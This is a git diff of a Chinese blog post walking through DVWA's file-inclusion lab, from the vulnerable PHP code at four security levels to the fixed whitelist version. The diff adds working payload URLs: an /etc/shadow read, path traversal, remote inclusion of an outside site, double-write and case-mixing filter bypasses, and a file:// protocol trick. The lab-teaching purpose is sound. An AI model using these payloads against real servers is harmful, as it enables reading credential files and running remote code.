@@ -8,18 +8,31 @@
   <link rel="dns-prefetch" href="https://knlvre.github.io/Knlvre.github-io">
   <title>DVWA 4-File Inclusion（文件包含） | Knlvre</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="源码位置1DVWA\vulnerabilities\csrf\source\ 页面功能更改当前用户的密码 Security Level — Low核心代码 12 Security Level — Medium核心代码 12 Security Level — High核心代码 12 Security Level — Impossible核心代码 12">
+  <meta name="description" content="源码位置1DVWA\vulnerabilities\fi\source\ 页面功能直接点击file1.php、file2.php、file3.php可以相应跳转到不同的界面  开启allow_url_include进入之后如果allow_url_include没有开启，会出现如下画面  此时只需要进入phpinfo，查看配置文件的路径，比如我的：C:\phpstudy\php\php-5.4.45">
 <meta name="keywords" content="DVWA">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DVWA 4-File Inclusion（文件包含）">
 <meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/02/13/DVWA 4-File Inclusion（文件包含）/index.html">
 <meta property="og:site_name" content="Knlvre">
-<meta property="og:description" content="源码位置1DVWA\vulnerabilities\csrf\source\ 页面功能更改当前用户的密码 Security Level — Low核心代码 12 Security Level — Medium核心代码 12 Security Level — High核心代码 12 Security Level — Impossible核心代码 12">
+<meta property="og:description" content="源码位置1DVWA\vulnerabilities\fi\source\ 页面功能直接点击file1.php、file2.php、file3.php可以相应跳转到不同的界面  开启allow_url_include进入之后如果allow_url_include没有开启，会出现如下画面  此时只需要进入phpinfo，查看配置文件的路径，比如我的：C:\phpstudy\php\php-5.4.45">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-08-02T08:17:48.547Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-12.png">
+<meta property="og:updated_time" content="2019-08-04T08:01:00.160Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DVWA 4-File Inclusion（文件包含）">
-<meta name="twitter:description" content="源码位置1DVWA\vulnerabilities\csrf\source\ 页面功能更改当前用户的密码 Security Level — Low核心代码 12 Security Level — Medium核心代码 12 Security Level — High核心代码 12 Security Level — Impossible核心代码 12">
+<meta name="twitter:description" content="源码位置1DVWA\vulnerabilities\fi\source\ 页面功能直接点击file1.php、file2.php、file3.php可以相应跳转到不同的界面  开启allow_url_include进入之后如果allow_url_include没有开启，会出现如下画面  此时只需要进入phpinfo，查看配置文件的路径，比如我的：C:\phpstudy\php\php-5.4.45">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-3.png">
   
     <link rel="alternative" href="/atom.xml" title="Knlvre" type="application/atom+xml">
   
@@ -157,16 +170,63 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\csrf\source\</span><br></pre></td></tr></table></figure>
-<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>更改当前用户的密码</p>
+        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\fi\source\</span><br></pre></td></tr></table></figure>
+<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>直接点击<code>file1.php、file2.php、file3.php</code>可以相应跳转到不同的界面</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-3.png" alt="4-3"></p>
+<h2 id="开启allow-url-include"><a href="#开启allow-url-include" class="headerlink" title="开启allow_url_include"></a>开启allow_url_include</h2><p>进入之后如果<code>allow_url_include</code>没有开启，会出现如下画面</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-1.png" alt="4-1"></p>
+<p>此时只需要进入<code>phpinfo</code>，查看配置文件的路径，比如我的：<code>C:\phpstudy\php\php-5.4.45\php.ini</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-2.png" alt="4-2"></p>
+<p>修改该配置文件中的<code>allow_url_include = On</code>，然后重启服务就可以了</p>
 <h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从代码中可以看出来，对接受的<code>page</code>参数没有经过任何的处理，我们现在分别点击初始页面中的<code>file1.php、file2.php、file3.php</code>，发现<code>URL</code>中改变的只有page参数</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-4.png" alt="4-4"></p>
+<p>既然page没有任何限制，现在就能读取其他文件，操作开始</p>
+<p>1.本地文件包含</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=/etc/shadow</span><br></pre></td></tr></table></figure>
+<p>没有找到文件，那就说明这台服务器并不是Linux服务器</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-5.png" alt="4-5"></p>
+<p>在服务器根目录下写一个test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo()</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用<code>绝对路径</code>访问test.php，访问成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=C:\phpstudy\www\test.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-6.png" alt="4-6"></p>
+<p>使用<code>相对路径</code>访问test.php，访问成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=../../../../../../phpstudy/www/test.php</span><br></pre></td></tr></table></figure>
+<p>Ps：多个<code>../</code>是为了能够保证到达当下盘的根目录；斜杠和反斜杠都可以</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-7.png" alt="4-7"></p>
+<p>2.远程文件包含</p>
+<p>当服务器的php配置中，选项<code>allow_url_fopen</code>与<code>allow_url_include</code>为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行</p>
+<p>直接试一下访问百度，直接访问成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=http://www.baidu.com</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-8.png" alt="4-8"></p>
 <h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从代码中可以看出来，利用<code>str_replace()</code>函数对<code>http://、https://、../、..\</code>这4个重要的关键字符进行了过滤，但是绕过规则也比较简单，直接<code>双写</code>或者<code>大小写</code>就可以解决</p>
+<p>虽然<code>../</code>无法绕过，但影响也不大，因为绝对路径还可以使用，试一下双写绕过，可以成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=hthttp://tp://www.baidu.com</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-9.png" alt="4-9"></p>
+<p>试一下大小写绕过，也可以成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=HtTp://www.baidu.com</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-10.png" alt="4-10"></p>
 <h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">"file*"</span>, $file ) &amp;&amp; $file != <span class="string">"include.php"</span> ) &#123;</span><br><span class="line">	<span class="comment">// This isn't the page we want!</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>源码中可以看出来通过<code>fnmatch()</code>函数限制了输入的参数必须以<code>file</code>开头，但是我们还是可以绕过</p>
+<p>1.file协议</p>
+<p>因为使用浏览器打开一个本地文件时，使用的是file协议，刚好以file开头</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///C:/phpstudy/WWW/file.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-11.png" alt="4-11"></p>
+<p>现在构造URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file:///C:/phpstudy/www/test.php</span><br></pre></td></tr></table></figure>
+<p>成功访问</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-12.png" alt="4-12"></p>
 <h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">"include.php"</span> &amp;&amp; $file != <span class="string">"file1.php"</span> &amp;&amp; $file != <span class="string">"file2.php"</span> &amp;&amp; $file != <span class="string">"file3.php"</span> ) &#123;</span><br><span class="line">	<span class="comment">// This isn't the page we want!</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Impossible难度只允许<code>include.php</code>或者<code>file{1..3}.php</code>，虽然不灵活，但是却彻底杜绝文件包含漏洞</p>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://www.freebuf.com/articles/web/119150.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/119150.html</a></p>
 
       
 
@@ -250,11 +310,11 @@
   
 <nav id="article-nav">
   
-    <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—杂项题 第1-10关/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/Knlvre.github-io/2019/02/14/DVWA 5-File Upload（文件上传）/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          BugKuCTF — 杂项题(第1-10关)
+          DVWA 5-File Upload（文件上传）
         
       </div>
     </a>
@@ -383,11 +443,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
               </li>
              
               <li class="article-tag-list-item">
